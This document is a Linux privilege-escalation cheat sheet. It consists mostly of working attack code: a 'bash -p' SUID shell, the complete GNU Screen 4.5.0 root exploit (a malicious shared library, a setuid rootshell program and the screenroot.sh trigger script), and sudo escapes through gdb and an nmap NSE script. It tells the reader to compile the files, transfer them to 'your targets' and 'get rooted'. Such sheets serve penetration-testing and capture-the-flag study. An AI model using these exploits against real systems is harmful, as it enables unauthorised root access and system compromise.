# Linux - CapSuidSudo

# Capabilities

# SUID

- [Bash](#bash)
- [Screen4.50](#screen450)

### Bash

```
bash -p
```

### Screen4.50

All of these file do it on your machine first then transfer the file to your targets.

Save the file in libhax.c. Then compile like the command below:
```
# Command to Compile
gcc -fPIC -shared -ldl -o libhax.so libhax.c

# Script To Save (libhax.c)

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
```

Save the file in rootshell.c. Then compile like the command below:
```
# Command to Compile
gcc -o rootshell rootshell.c

# Script To Save (rootshell.c)

#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
```

Save the file in screenroot.sh like below:
```
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017) 
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so... 
/tmp/rootshell
```

After that please transfer all of the files and chmod 777 all the transfer files on your target machine. Run like below and get rooted!
```
./screenroot.sh
./rootshell
```

Link => [ExploitDB-41154](https://www.exploit-db.com/exploits/41154)


# Sudo

- [Gdb](#gdb)
- [Nmap](#nmap)

## GDB

```
sudo /usr/bin/gdb -nx -ex '!sh' -ex quit
```

## Nmap

```
echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
```